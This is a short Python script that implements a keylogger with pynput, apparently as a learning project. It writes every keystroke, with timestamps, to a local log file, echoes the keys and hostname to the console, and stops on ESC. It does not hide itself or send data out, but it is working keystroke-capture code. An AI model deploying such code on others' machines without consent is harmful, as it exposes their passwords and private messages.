# libraries 
from pynput import keyboard
from datetime import datetime
import os
import platform
import socket
import threading 


# Config
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(SCRIPT_DIR, "logs")
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
os.makedirs(LOG_DIR, exist_ok=True)

# Global variables for stopping
stop_flag = threading.Event()
listener = None

# Function to stop the keylogger
def stop_keylogger():
    stop_flag.set()
    if listener:
        listener.stop()
    print("\n[*] Keylogger stopped.")

# Function to start capturing keystrokes
def start_keylogger():
    global listener
    def on_press(key):
        if stop_flag.is_set():
            return False  # Stop the listener
        with open(LOG_FILE, "a") as f:
            platform_info = platform.system()
            hostname = socket.gethostname()

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] {key} pressed on {platform_info} ({hostname})")  # Console output
            
            try:
                f.write(f"[{timestamp}] {key.char}\n")
            except AttributeError:
                # Format special keys nicely
                special_keys = {
                    "Key.space":     "[SPACE]",
                    "Key.enter":     "[ENTER]",
                    "Key.backspace": "[BACKSPACE]",
                    "Key.tab":       "[TAB]",
                    "Key.shift":     "[SHIFT]",
                    "Key.shift_r":   "[SHIFT]",
                    "Key.ctrl_l":    "[CTRL]",
                    "Key.ctrl_r":    "[CTRL]",
                    "Key.alt_l":     "[ALT]",
                    "Key.alt_r":     "[ALT]",
                    "Key.caps_lock": "[CAPS LOCK]",
                    "Key.delete":    "[DELETE]",
                    "Key.esc":       "[ESC]",
                    "Key.up":        "[UP]",
                    "Key.down":      "[DOWN]",
                    "Key.left":      "[LEFT]",
                    "Key.right":     "[RIGHT]",
                    "Key.home":      "[HOME]",
                    "Key.end":       "[END]",
                    "Key.page_up":   "[PAGE UP]",
                    "Key.page_down": "[PAGE DOWN]",
                }

                key_str = str(key)
                label = special_keys.get(key_str, f"[{key_str.upper()}]")
                f.write(f"[{timestamp}] {label}\n")

    def on_release(key):
        if key == keyboard.Key.esc:
            stop_keylogger()  # Stop on ESC
            return False

    print("Keylogger started. Press ESC to stop or call stop_keylogger().")
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

# To activate, call start_keylogger()
if __name__ == "__main__":
    start_keylogger()
    
